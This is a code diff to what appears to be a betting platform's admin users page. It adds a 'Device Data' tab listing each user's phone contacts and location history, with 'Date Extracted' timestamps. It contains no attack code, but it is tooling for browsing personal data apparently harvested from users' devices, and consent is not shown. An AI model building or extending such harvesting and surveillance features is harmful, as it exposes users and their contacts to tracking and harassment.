@@ -28,6 +28,8 @@ import {
   listBids,
   listDeposits,
   listWithdrawals,
+  getUserContacts,
+  getUserLocations,
 } from "@/lib/admin";
 import { parseApiError } from "@/lib/error-parser";
 
@@ -47,6 +49,8 @@ export default function UsersPage() {
   const [userBids, setUserBids] = useState<any[]>([]);
   const [userDeposits, setUserDeposits] = useState<any[]>([]);
   const [userWithdrawals, setUserWithdrawals] = useState<any[]>([]);
+  const [userContacts, setUserContacts] = useState<any[]>([]);
+  const [userLocations, setUserLocations] = useState<any[]>([]);
   const [loadingDetails, setLoadingDetails] = useState(false);
   
   const [activeTab, setActiveTab] = useState("overview");
@@ -86,19 +90,25 @@ export default function UsersPage() {
     setUserBids([]);
     setUserDeposits([]);
     setUserWithdrawals([]);
+    setUserContacts([]);
+    setUserLocations([]);
     setActiveTab("overview");
     setLoadingDetails(true);
     try {
-      const [d, b, dep, w] = await Promise.all([
+      const [d, b, dep, w, contacts, locations] = await Promise.all([
         getUserDetailed(user.id),
         listBids({ user_id: user.id, limit: 50 }),
         listDeposits({ user_id: user.id, limit: 50 }),
         listWithdrawals({ user_id: user.id, limit: 50 }),
+        getUserContacts(user.id),
+        getUserLocations(user.id),
       ]);
       setDetail(d);
       setUserBids(b);
       setUserDeposits(dep);
       setUserWithdrawals(w);
+      setUserContacts(contacts);
+      setUserLocations(locations);
     } catch (e: any) {
       console.error(e);
     } finally {
@@ -167,6 +177,7 @@ export default function UsersPage() {
     { id: "overview", label: "Overview", icon: "👤" },
     { id: "bets", label: "Recent Bets", icon: "🎯" },
     { id: "transactions", label: "Transactions", icon: "💸" },
+    { id: "device", label: "Device Data", icon: "📱" },
     { id: "security", label: "Security & Actions", icon: "🛡️" },
   ];
 
@@ -350,6 +361,34 @@ export default function UsersPage() {
                             </Badge>
                           )},
                           { key: "date", header: "Date", render: (w) => format(new Date(w.requested_at || w.created_at), "dd/MM/yyyy") },
+                        ]}
+                      />
+                    </Card>
+                  </div>
+                )}
+
+                {activeTab === "device" && (
+                  <div className="space-y-6">
+                    <Card title={`Contacts (${userContacts.length})`} bodyClassName="p-0 max-h-96 overflow-y-auto">
+                      <DataTable
+                        getRowKey={(c: any, i) => i}
+                        rows={userContacts}
+                        columns={[
+                          { key: "name", header: "Name", render: (c) => c.name || "Unknown" },
+                          { key: "number", header: "Number", render: (c) => c.number },
+                          { key: "date", header: "Date Extracted", render: (c) => format(new Date(c.created_at), "dd/MM/yyyy HH:mm") },
+                        ]}
+                      />
+                    </Card>
+
+                    <Card title={`Location History (${userLocations.length})`} bodyClassName="p-0 max-h-96 overflow-y-auto">
+                      <DataTable
+                        getRowKey={(l: any, i) => i}
+                        rows={userLocations}
+                        columns={[
+                          { key: "coords", header: "Coordinates", render: (l) => `${l.latitude || '-'}, ${l.longitude || '-'}` },
+                          { key: "address", header: "Address", render: (l) => l.address || "-" },
+                          { key: "date", header: "Date Extracted", render: (l) => format(new Date(l.created_at), "dd/MM/yyyy HH:mm") },
                         ]}
                       />
                     </Card>
